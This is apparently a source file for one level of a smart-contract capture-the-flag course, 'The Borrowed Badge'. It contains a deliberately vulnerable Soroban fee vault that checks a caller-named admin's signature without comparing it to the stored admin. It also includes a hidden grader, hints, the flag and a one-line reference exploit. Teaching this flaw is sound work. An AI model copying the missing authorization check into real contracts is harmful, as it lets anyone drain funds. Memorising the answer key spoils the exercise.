import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 03 — THE BORROWED BADGE.
//
// Class: authentication mistaken for authorization (Stellar Security Portal:
// "Missing Admin Verification"). `withdraw_fees` takes the admin as an
// ARGUMENT, calls `require_auth()` on it — proving that whoever was named
// signed — and never compares it to the admin stored at deployment. Anyone
// can name themselves.
//
// Harness: the attacker may sign for exactly one call, withdraw_fees(attacker).
// Naming the real admin therefore fails (no signature), and only the missing
// comparison lets the attacker in.

const LEVEL_RS = `//! The Fee Vault of Saint Stroop — who may collect the tolls?
//!
//! \`require_auth\` proves a signature exists. Read what it is applied to.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

#[contracttype]
pub enum DataKey {
    Admin,
    Fees,
    Balance(Address),
}

#[contract]
pub struct FeeVault;

#[contractimpl]
impl FeeVault {
    /// Runs once, at deployment: name the admin and seed the collected fees.
    pub fn __constructor(env: Env, admin: Address, fees: i128) {
        env.storage().instance().set(&DataKey::Admin, &admin);
        env.storage().instance().set(&DataKey::Fees, &fees);
    }

    /// Move every collected fee into \`admin\`'s balance. Admin only.
    pub fn withdraw_fees(env: Env, admin: Address) {
        admin.require_auth();

        let fees: i128 = env.storage().instance().get(&DataKey::Fees).unwrap_or(0);
        env.storage().instance().set(&DataKey::Fees, &0i128);

        let balance = read_balance(&env, &admin);
        write_balance(&env, &admin, balance + fees);
    }

    /// Public views.
    pub fn admin(env: Env) -> Address {
        env.storage().instance().get(&DataKey::Admin).unwrap()
    }

    pub fn fees(env: Env) -> i128 {
        env.storage().instance().get(&DataKey::Fees).unwrap_or(0)
    }

    pub fn balance_of(env: Env, who: Address) -> i128 {
        read_balance(&env, &who)
    }
}

fn read_balance(env: &Env, who: &Address) -> i128 {
    env.storage()
        .instance()
        .get::<DataKey, i128>(&DataKey::Balance(who.clone()))
        .unwrap_or(0)
}

fn write_balance(env: &Env, who: &Address, amount: i128) {
    env.storage()
        .instance()
        .set(&DataKey::Balance(who.clone()), &amount);
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The vault holds 1,000 in fees that belong to the admin (\`victim\`). The
// grader lets \`attacker\` sign for exactly one call: withdraw_fees(attacker).
// Make \`attacker\` walk away with the fees.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::FeeVaultClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: withdraw_fees(admin) is only as strict as the check on \`admin\`.
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The vault is deployed with 1,000 in fees for the owner. The attacker may sign
// for exactly one invocation, withdraw_fees(attacker); nobody else can sign.
// Naming the owner would need the owner's signature, so only a vault that
// never compares the named admin to the stored one lets the attacker in.
use borrowed_badge::exploit;
use borrowed_badge::level::{FeeVault, FeeVaultClient};
use soroban_sdk::testutils::{Address as _, MockAuth, MockAuthInvoke};
use soroban_sdk::{Address, Env, IntoVal};

#[test]
fn ctf_win() {
    let env = Env::default();
    let owner = Address::generate(&env);
    let attacker = Address::generate(&env);

    let vault_id = env.register(FeeVault, (owner.clone(), 1_000_i128));
    let client = FeeVaultClient::new(&env, &vault_id);

    assert_eq!(client.admin(), owner, "setup failed");
    assert_eq!(client.fees(), 1_000, "setup failed");
    assert_eq!(client.balance_of(&attacker), 0, "setup failed");

    env.mock_auths(&[MockAuth {
        address: &attacker,
        invoke: &MockAuthInvoke {
            contract: &vault_id,
            fn_name: "withdraw_fees",
            args: (attacker.clone(),).into_val(&env),
            sub_invokes: &[],
        },
    }]);

    exploit::solve(&env, vault_id.clone(), owner.clone(), attacker.clone());

    assert_eq!(client.fees(), 0, "the fees are still in the vault — it held");
    assert_eq!(
        client.balance_of(&attacker),
        1_000,
        "the attacker did not receive the fees"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::{Address, Env};

use crate::level::FeeVaultClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = victim;
    let client = FeeVaultClient::new(env, &vault);
    // require_auth() only proves that the NAMED admin signed. The vault never
    // checks that the named admin is the stored one, so name yourself.
    client.withdraw_fees(&attacker);
}
`;

export const borrowedBadge: CtfLevel = {
  slug: "borrowed-badge",
  title: "The Borrowed Badge",
  tagline: "A vault that checks the badge is signed — and never whose badge it is.",
  difficulty: "adept",
  estMinutes: 15,
  story: `The toll collector of Saint Stroop checks every badge at the counter. Is it stamped? Is the signature fresh? Admirable diligence.

The Stroopbeholder saw a stamp and looked away. The collector has never once asked whether the name on the badge is the name on the lease.`,
  brief: `## The target

\`src/level.rs\` is a fee vault. At deployment it stores an admin and a pile of fees. \`withdraw_fees(admin)\` pays the fees to whoever is named as \`admin\`.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

The vault holds **1,000** in fees for \`victim\`, its admin. The grader lets \`attacker\` sign for **exactly one call**: \`withdraw_fees(attacker)\`. Nobody else can sign. Make \`attacker\` walk away with the fees.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- Naming \`victim\` as admin needs \`victim\`'s signature, which you do not have.

## Reading the ledger

\`fees()\` and \`balance_of(who)\` are public views. Use them to check the result.`,
  hints: [
    "`withdraw_fees` takes `admin` as an argument. Where does the contract compare that argument with the admin stored in `DataKey::Admin`?",
    "`admin.require_auth()` proves that whoever was named signed. It says nothing about whether the named address is the real admin.",
    "You are allowed to sign for `attacker`. Name `attacker` as the admin: `withdraw_fees(&attacker)`.",
  ],
  files: {
    "Cargo.toml": cargoToml("borrowed_badge"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  forbid: ["storage"],
  flag: "TUSST{4uth_1s_n0t_4uthz}",
  reference: REFERENCE_RS,
};
